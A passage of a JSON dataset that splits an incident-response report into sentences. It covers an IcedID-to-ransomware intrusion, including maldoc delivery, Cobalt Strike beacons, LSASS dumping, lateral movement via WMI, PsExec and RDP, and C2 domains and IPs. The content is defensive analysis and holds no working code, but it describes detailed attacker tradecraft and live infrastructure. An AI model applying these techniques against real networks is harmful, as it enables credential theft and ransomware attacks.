        "type": "",
        "report": "r-dfir-2",
        "line": 7,
        "index": 3700
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S8",
        "text": "Around two hours after the initial malware ran, IcedID loaded several Cobalt Strike beacons on the beachhead.",
        "type": "",
        "report": "r-dfir-2",
        "line": 8,
        "index": 3701
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S9",
        "text": "Within minutes of running Cobalt Strike on the beachhead the threat actors proceeded to elevate to SYSTEM permissions and dump LSASS memory using the beacons.",
        "type": "",
        "report": "r-dfir-2",
        "line": 9,
        "index": 3702
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S10",
        "text": "Following this activity, the threat actors conducted further reconnaissance, and then moved laterally to a Domain Controller through the execution of a Cobalt Strike payload via WMI.\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 10,
        "index": 3703
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S11",
        "text": "Next, discovery tasks continued from the beachhead host, including network scans for port 1433 (MSSQL) and browsing network shares with an interest in password files.",
        "type": "",
        "report": "r-dfir-2",
        "line": 11,
        "index": 3704
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S12",
        "text": "The threat actors appeared to have removed some contents of the network shares off the network as canary files report the documents being opened off network minutes later.",
        "type": "",
        "report": "r-dfir-2",
        "line": 12,
        "index": 3705
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S13",
        "text": "After this, the threat actors remained quiet over the next several days.",
        "type": "",
        "report": "r-dfir-2",
        "line": 13,
        "index": 3706
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S14",
        "text": "On the fourth day, the threat actors returned briefly to execute a few commands on the Domain Controller related to the enumeration of domain computers and high privilege user account groups.",
        "type": "",
        "report": "r-dfir-2",
        "line": 14,
        "index": 3707
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S15",
        "text": "Privilege escalation was also observed on the system via named pipe impersonation.\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 15,
        "index": 3708
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S16",
        "text": "Early on the sixth day, the threat actors became active again launching the Edge browser on the beachhead host and appeared to download a file from dropmefiles[.]com.",
        "type": "",
        "report": "r-dfir-2",
        "line": 16,
        "index": 3709
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S17",
        "text": "But after completing this, they went silent again for around another eight hours.",
        "type": "",
        "report": "r-dfir-2",
        "line": 17,
        "index": 3710
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S18",
        "text": "Then, from the beachhead host, a new process was spawned from the IcedID malware; and from this shell, the threat actors began enumerating Active Directory using adget and AdFind.\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 18,
        "index": 3711
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S19",
        "text": "The threat actors then began to spread laterally using a combination of Cobalt Strike beacon DLLs, batch scripts, and WMI commands.",
        "type": "",
        "report": "r-dfir-2",
        "line": 19,
        "index": 3712
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S20",
        "text": "More credential dumping was observed, followed by additional AdFind and other Windows discovery commands.",
        "type": "",
        "report": "r-dfir-2",
        "line": 20,
        "index": 3713
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S21",
        "text": "The threat actors then continued lateral movement and began checking RDP access across the environment.",
        "type": "",
        "report": "r-dfir-2",
        "line": 21,
        "index": 3714
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S22",
        "text": "A batch file was run enumerating hostnames throughout the environment using nslookup.",
        "type": "",
        "report": "r-dfir-2",
        "line": 22,
        "index": 3715
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S23",
        "text": "Some further pivoting around systems and targeted discovery continued throughout the rest of the day.\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 23,
        "index": 3716
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S24",
        "text": "On the seventh day, around 23 hours since the last activity in the environment the threat actors began the final phase of the intrusion.",
        "type": "",
        "report": "r-dfir-2",
        "line": 24,
        "index": 3717
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S25",
        "text": "The threat actors connected to a compromised server via RDP.",
        "type": "",
        "report": "r-dfir-2",
        "line": 25,
        "index": 3718
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S26",
        "text": "From this server they would stage the ransomware deployment.",
        "type": "",
        "report": "r-dfir-2",
        "line": 26,
        "index": 3719
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S27",
        "text": "They deployed the ransomware payload, Sysinternals PsExec, and a cluster of batch files 1.bat-6.bat and p.bat.",
        "type": "",
        "report": "r-dfir-2",
        "line": 27,
        "index": 3720
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S28",
        "text": "Opening a command prompt, they moved through executing the batch files copying p.bat, a renamed PsExec, and the ransomware payload to all domain joined hosts.",
        "type": "",
        "report": "r-dfir-2",
        "line": 28,
        "index": 3721
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S29",
        "text": "They then used the batch scripts to execute the ransomware payload via PsExec and WMI.",
        "type": "",
        "report": "r-dfir-2",
        "line": 29,
        "index": 3722
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S30",
        "text": "The time to ransomware (TTR) was around 148 hours (~6 days) from the initial infection.",
        "type": "",
        "report": "r-dfir-2",
        "line": 30,
        "index": 3723
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S31",
        "text": "After the intrusion, contact was made with the threat actors using their support site and the price of the ransom was quoted around $200,000 USD in Bitcoin.",
        "type": "",
        "report": "r-dfir-2",
        "line": 31,
        "index": 3724
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S32",
        "text": "No ransom was paid as a result of this intrusion.",
        "type": "",
        "report": "r-dfir-2",
        "line": 32,
        "index": 3725
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S33",
        "text": "This intrusion is linked to an IcedID malspam campaign that was observed in October 2022 targeting Italian organizations based on overlap in the maldoc template and the IcedID C2 server.",
        "type": "",
        "report": "r-dfir-2",
        "line": 33,
        "index": 3726
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S34",
        "text": "This case involved an IcedID payload delivered through an Excel maldoc containing VBA macros that were linked to the two images embedded in the document, which caused the macros to execute when a user clicks on either of the images:\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 34,
        "index": 3727
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S35",
        "text": "The macro associated with the maldoc reached out to a hard-coded domain and downloaded the first stage IcedID payload.",
        "type": "",
        "report": "r-dfir-2",
        "line": 35,
        "index": 3728
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S36",
        "text": "More on this in the next section.",
        "type": "",
        "report": "r-dfir-2",
        "line": 36,
        "index": 3729
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S37",
        "text": "Once the VBA macro was invoked, Excel connected to the hard-coded domain and downloaded the first stage of the IcedID payload.",
        "type": "",
        "report": "r-dfir-2",
        "line": 37,
        "index": 3730
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S38",
        "text": "When the VBA macro from Excel calls out to the hard-coded domain, it has multiple interesting characteristics, including:\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 38,
        "index": 3731
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S39",
        "text": "- Two OPTIONS requests followed by a GET request.\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 39,
        "index": 3732
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S40",
        "text": "- User-agent fields mentioning Microsoft Office.\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 40,
        "index": 3733
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S41",
        "text": "- Specific HTTP headers such as X-Office-Major-Version , X-MSGETWEBURL , X-IDCRL_ACCEPTED , and UA-CPU .\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 41,
        "index": 3734
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S42",
        "text": "Once the IcedID payload is successfully retrieved, it will be decoded with Base64 and written to disk.",
        "type": "",
        "report": "r-dfir-2",
        "line": 42,
        "index": 3735
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S43",
        "text": "In this case, the payload was written to the path retrieved from Application.DefaultFilePath , which is the default path used by Excel when it opens files.\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 43,
        "index": 3736
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S44",
        "text": "The random name generated for the IcedID payload may be either 1 to 7 random digits, or 4500 .",
        "type": "",
        "report": "r-dfir-2",
        "line": 44,
        "index": 3737
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S45",
        "text": "This is because the Rnd function will return \u201ca value less than 1 but greater than or equal to zero\u201c.",
        "type": "",
        "report": "r-dfir-2",
        "line": 45,
        "index": 3738
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S46",
        "text": "Once the IcedID payload is successfully written to disk, the following post deployment steps are initiated:\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 46,
        "index": 3739
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S47",
        "text": "- Rundll32.exe is copied into a file named calc.exe under the path returned by Application.DefaultFilePath .\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 47,
        "index": 3740
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S48",
        "text": "- Calc.exe (renamed rundll32.exe) is used to invoke the IcedID payload.",
        "type": "",
        "report": "r-dfir-2",
        "line": 48,
        "index": 3741
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S49",
        "text": "In this case, rundll32.exe was copied into the user Documents folder and named calc.exe.",
        "type": "",
        "report": "r-dfir-2",
        "line": 49,
        "index": 3742
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S50",
        "text": "The name \u2018calc.exe\u2019 is hard-coded into the VBA code and will not be changed.\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 50,
        "index": 3743
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S51",
        "text": "Once the VBA macros invoked the IcedID payload, the parent-child process relationship between Excel and calc.exe was observed.",
        "type": "",
        "report": "r-dfir-2",
        "line": 51,
        "index": 3744
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S52",
        "text": "The following diagram provides a visual summary of the process to execute IcedID on the endpoint.",
        "type": "",
        "report": "r-dfir-2",
        "line": 52,
        "index": 3745
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S53",
        "text": "The threat actors were observed making use of an VNC module that was spawned by IcedID to spawn the Microsoft Edge browser:\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 53,
        "index": 3746
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S54",
        "text": "We were able to reconstruct some of the VNC traffic thanks to @0xThiebaut\u2018s tool PCAPeek.",
        "type": "",
        "report": "r-dfir-2",
        "line": 54,
        "index": 3747
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S55",
        "text": "You can see the below options such as Edge, Chrome, Firefox, CMD, Task Manager and run dialog.",
        "type": "",
        "report": "r-dfir-2",
        "line": 55,
        "index": 3748
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S56",
        "text": "Based on the visual it appears to be the KeyHole VNC module reported first observed in Oct 2022 by NVISO.\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 56,
        "index": 3749
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S57",
        "text": "In another instance, a run dialog was observed being used to execute the calc.exe file that was created earlier.",
        "type": "",
        "report": "r-dfir-2",
        "line": 57,
        "index": 3750
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S58",
        "text": "More information can be found about this here.\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 58,
        "index": 3751
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S59",
        "text": "However, the command below would have no effect in this case as calc.exe is a renamed version of rundll32 and no parameters were passed.",
        "type": "",
        "report": "r-dfir-2",
        "line": 59,
        "index": 3752
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S60",
        "text": "Several other programs were seen run in this manner, as seen in process execution logs below:\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 60,
        "index": 3753
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S61",
        "text": "The threat actors used Cobalt Strike beacons throughout the intrusion.",
        "type": "",
        "report": "r-dfir-2",
        "line": 61,
        "index": 3754
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S62",
        "text": "The first beacon was executed via PowerShell, which in turn was executed initially by a command shell which was started by the IcedID malware at the same time a DLL beacon was also executed.",
        "type": "",
        "report": "r-dfir-2",
        "line": 62,
        "index": 3755
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S63",
        "text": "The downloaded PowerShell payload, previously hosted on hxxps://aicsoftware[.]com:757/coin, is available on VirusTotal.",
        "type": "",
        "report": "r-dfir-2",
        "line": 63,
        "index": 3756
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S64",
        "text": "Here is the content of the payload, where we can observe an object being created in memory using an encoded string.",
        "type": "",
        "report": "r-dfir-2",
        "line": 64,
        "index": 3757
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S65",
        "text": "We will walk through decoding this string to view the Cobalt Strike configuration present within.",
        "type": "",
        "report": "r-dfir-2",
        "line": 65,
        "index": 3758
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S66",
        "text": "After initial Base64 decoding, we found the payload used the default Cobalt Strike XOR value of 35 which allows for the next step of decoding the payload.",
        "type": "",
        "report": "r-dfir-2",
        "line": 66,
        "index": 3759
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S67",
        "text": "After this an MZ header can be observed.",
        "type": "",
        "report": "r-dfir-2",
        "line": 67,
        "index": 3760
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S68",
        "text": "From there, the data can be saved and reviewed using 1768.py from Didier Stevens, revealing the Cobalt Strike configuration embedded within:\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 68,
        "index": 3761
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S69",
        "text": "After using PowerShell beacons during the first day on the beachhead host and a Domain Controller, the threat actors moved to using DLL files exclusively for the remainder of Cobalt Strike beacons deployed during the intrusion.",
        "type": "",
        "report": "r-dfir-2",
        "line": 69,
        "index": 3762
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S70",
        "text": "Other notable executions included the use of batch files:\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 70,
        "index": 3763
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S71",
        "text": "During the initial execution of IcedID, the following two files were created under the AppData Roaming folder of the user that executed it:\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 71,
        "index": 3764
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S72",
        "text": "- exdudipo.dll : IcedID first stage.\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 72,
        "index": 3765
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S73",
        "text": "- license.dat: Encoded version of the second stage which the first stage will load into memory.",
        "type": "",
        "report": "r-dfir-2",
        "line": 73,
        "index": 3766
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S74",
        "text": "A scheduled task was created that contained instructions on executing the IcedID DLL and the location of the license.dat file.",
        "type": "",
        "report": "r-dfir-2",
        "line": 74,
        "index": 3767
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S75",
        "text": "This is a very common method that IcedID has used for persistence.\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 75,
        "index": 3768
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S76",
        "text": "The scheduled task was configured to execute every hour.\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 76,
        "index": 3769
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S77",
        "text": "Privilege escalation was completed on two systems via the named pipe GetSystem feature within the Cobalt Strike tool.",
        "type": "",
        "report": "r-dfir-2",
        "line": 77,
        "index": 3770
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S78",
        "text": "An example is shown below via Sysmon event ID 1 \u2013 ProcessCreate Rule:\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 78,
        "index": 3771
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S79",
        "text": "This intrusion displayed numerous techniques used by threat actors to evade detection.\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 79,
        "index": 3772
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S80",
        "text": "The adversary was seen injecting code into legitimate processes via CreateRemoteThread which can be detected using Sysmon event ID 8.\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 80,
        "index": 3773
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S81",
        "text": "The table below shows examples of injected processes found via an in memory yara scan using this Malpedia yara rule:\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 81,
        "index": 3774
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S82",
        "text": "Files that were dropped in temporary directories were deleted after execution as seen below with Sysmon event ID 11 and 23.\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 82,
        "index": 3775
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S83",
        "text": "Below is the list of files seen being created and later deleted by the threat actor:\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 83,
        "index": 3776
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S84",
        "text": "Adversaries typically rename common Windows system utilities to avoid triggering alerts that monitor utility usage.",
        "type": "",
        "report": "r-dfir-2",
        "line": 84,
        "index": 3777
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S85",
        "text": "The table below summaries the renamed utilities observed in this intrusion.",
        "type": "",
        "report": "r-dfir-2",
        "line": 85,
        "index": 3778
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S86",
        "text": "The threat actors were observed accessing a file server, and browsing though files related to passwords.",
        "type": "",
        "report": "r-dfir-2",
        "line": 86,
        "index": 3779
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S87",
        "text": "These would later be observed opened off network, more details in the exfiltration section on that activity.\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 87,
        "index": 3780
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S88",
        "text": "On the second day of the intrusion, after moving laterally to a Domain Controller, LSASS was accessed from a Cobalt Strike process.",
        "type": "",
        "report": "r-dfir-2",
        "line": 88,
        "index": 3781
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S89",
        "text": "The access granted value 0x1010 was observed.",
        "type": "",
        "report": "r-dfir-2",
        "line": 89,
        "index": 3782
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S90",
        "text": "As noted in a previous report, this value matches known mimikatz access patterns.",
        "type": "",
        "report": "r-dfir-2",
        "line": 90,
        "index": 3783
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S91",
        "text": "This logged event suggests Cobalt Strike accessed LSASS to dump credentials from memory.",
        "type": "",
        "report": "r-dfir-2",
        "line": 91,
        "index": 3784
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S92",
        "text": "This activity was observed again on various hosts on the fourth and sixth days of the intrusion.",
        "type": "",
        "report": "r-dfir-2",
        "line": 92,
        "index": 3785
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S93",
        "text": "The discovery phase primarily utilized built-in Windows tools.",
        "type": "",
        "report": "r-dfir-2",
        "line": 93,
        "index": 3786
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S94",
        "text": "One utility seen was chcp which allows you to display or set the code page number.",
        "type": "",
        "report": "r-dfir-2",
        "line": 94,
        "index": 3787
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S95",
        "text": "The default chcp value is determined by the Windows locale.",
        "type": "",
        "report": "r-dfir-2",
        "line": 95,
        "index": 3788
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S96",
        "text": "The locale can indicate the language, country, and regional standards of that host (e.g. date and time formatting).",
        "type": "",
        "report": "r-dfir-2",
        "line": 96,
        "index": 3789
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S97",
        "text": "After viewing the default page code, the adversary did change the value to 65001 to reflect the UTF-8 character set.",
        "type": "",
        "report": "r-dfir-2",
        "line": 97,
        "index": 3790
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S98",
        "text": "We have seen this as a technique employed by IcedID for some time as reported in depth in prior cases.",
        "type": "",
        "report": "r-dfir-2",
        "line": 98,
        "index": 3791
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S99",
        "text": "Following the initial discovery commands mentioned above on day one, the threat actor scanned the network for port 1433, the default port used by Microsoft SQL server.",
        "type": "",
        "report": "r-dfir-2",
        "line": 99,
        "index": 3792
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S100",
        "text": "The discovery phase remained minimal leading into day six.",
        "type": "",
        "report": "r-dfir-2",
        "line": 100,
        "index": 3793
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S101",
        "text": "The threat actors were seen dropping AdFind and adget.exe to reveal all users, groups, computers, organizational units, subnets, and trust objects within the domain.",
        "type": "",
        "report": "r-dfir-2",
        "line": 101,
        "index": 3794
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S102",
        "text": "Adget is a newer tool that we first observed in this previous report but generally this tool performs similar AD discovery as AdFind.\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 102,
        "index": 3795
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S103",
        "text": "Following the Active Directory discovery activity, additional remote discovery actions were observed using WMI to gather information about Windows OS version and licensing on the hosts.",
        "type": "",
        "report": "r-dfir-2",
        "line": 103,
        "index": 3796
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S104",
        "text": "Then another recon round occurred using NSLOOKUP to map assets to IP addresses.",
        "type": "",
        "report": "r-dfir-2",
        "line": 104,
        "index": 3797
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S105",
        "text": "This was followed by network scans for RDP:\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 105,
        "index": 3798
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S106",
        "text": "During this intrusion, threat actors used a number of different techniques to move laterally across the domain.",
        "type": "",
        "report": "r-dfir-2",
        "line": 106,
        "index": 3799
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S107",
        "text": "The techniques used will be detailed in the following sections.\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 107,
        "index": 3800
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S108",
        "text": "Some of the threat actors\u2019 lateral activity was executed using WinRM, this could be observed by matching parent-child process trees and DCE RPC traffic.\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 108,
        "index": 3801
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S109",
        "text": "Threat Actors ran the following command to download and execute an in memory PowerShell payload on a domain controller:\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 109,
        "index": 3802
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S110",
        "text": "WMI was also used also when executing remote DLL beacons:\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 110,
        "index": 3803
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S111",
        "text": "WMI commands were also observed during ransom deployment:\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 111,
        "index": 3804
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S112",
        "text": "The threat actors relied on SMB to move their tools throughout the network during the intrusion.\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 112,
        "index": 3805
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S113",
        "text": "The threat actors used PSExec to move laterally to servers during the ransom execution, the -r flag was used to rename the binary created on the remote server to mstdc.exe .\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 113,
        "index": 3806
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S114",
        "text": "Below are some of the PsExec forensic artifacts logged in Windows Event Logs and Sysmon:",
        "type": "",
        "report": "r-dfir-2",
        "line": 114,
        "index": 3807
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S115",
        "text": "Overview of the mstdc.exe binary (renamed psexecsvc.exe):\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 115,
        "index": 3808
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S116",
        "text": "Renaming PsExec is likely an action taken by threat actors to bypass basic PsExec anomaly rules.",
        "type": "",
        "report": "r-dfir-2",
        "line": 116,
        "index": 3809
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S117",
        "text": "However, there are Sigma rules which detect this specific technique, as shared by Florian Roth back in 2019.\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 117,
        "index": 3810
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S118",
        "text": "They also employed use of the Windows copy utility to move files around the network via SMB:\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 118,
        "index": 3811
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S119",
        "text": "Threat actors also used RDP during this intrusion.",
        "type": "",
        "report": "r-dfir-2",
        "line": 119,
        "index": 3812
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S120",
        "text": "Below is an example of forensic artifacts left after using RDP to move laterally from the beachhead to one of the domain servers logged in Windows Event Logs using different providers:\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 120,
        "index": 3813
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S121",
        "text": "During discovery actions, the threat actors were observed using 7-Zip to archive data collected from active directory using AdFind.\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 121,
        "index": 3814
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S122",
        "text": "In this case IcedID was observed with the campaign ID of 3298576311 communicating with a C2 server located at kicknocisd[.]com.\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 122,
        "index": 3815
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S123",
        "text": "Suricata Rule Name Domain IP AS ORG Country ET MALWARE Win32/IcedID Request Cookie kicknocisd[.]com 159.65.169[.]200 DIGITALOCEAN-ASN United States\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 123,
        "index": 3816
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S124",
        "text": "After initial connections, IcedID command and control traffic moved to the following servers.",
        "type": "",
        "report": "r-dfir-2",
        "line": 124,
        "index": 3817
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S125",
        "text": "Connections to one of the IcedID servers was observed in memory dumps from the beachhead host.",
        "type": "",
        "report": "r-dfir-2",
        "line": 125,
        "index": 3818
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S126",
        "text": "This evidence is consistent with the connections to 45.66.248[.]119 observed from the renamed rundll32.exe that loaded the IcedID DLL during maldoc execution at the beginning of this case.",
        "type": "",
        "report": "r-dfir-2",
        "line": 126,
        "index": 3819
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S127",
        "text": "During the intrusion we also observed connections to a BackConnect VNC IP address.",
        "type": "",
        "report": "r-dfir-2",
        "line": 127,
        "index": 3820
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S128",
        "text": "These connections were also spawned from the running IcedID process on the beachhead host.\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 128,
        "index": 3821
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S129",
        "text": "Alerts from Lenny Hansson\u2018s ruleset fired on the traffic for the following alerts:\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 129,
        "index": 3822
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S130",
        "text": "Here\u2019s another look at the VNC GUI from the attackers standpoint.",
        "type": "",
        "report": "r-dfir-2",
        "line": 130,
        "index": 3823
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S131",
        "text": "In the execution section we covered utilities launched by the threat actors from the VNC activity.\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 131,
        "index": 3824
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S132",
        "text": "On the sixth day, the threat actors launched an Edge browser on the beachhead host, via VNC as described in the execution section, and connected to the site dropmefiles[.]com a site that offers free file transfer services.",
        "type": "",
        "report": "r-dfir-2",
        "line": 132,
        "index": 3825
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S133",
        "text": "Data connections from the Edge browser in the SRUMDB indicate that a file download occurred but we were unable to determine what the file was or its purpose related to the intrusion.",
        "type": "",
        "report": "r-dfir-2",
        "line": 133,
        "index": 3826
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S134",
        "text": "The threat actors dropped and executed a malicious DLL, p1.dll, on the beachhead.",
        "type": "",
        "report": "r-dfir-2",
        "line": 134,
        "index": 3827
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S135",
        "text": "This malicious DLL is a Cobalt Strike beacon reaching out to 23.29.115.152/aicsoftware[.]com on ports 757 and 8080.",
        "type": "",
        "report": "r-dfir-2",
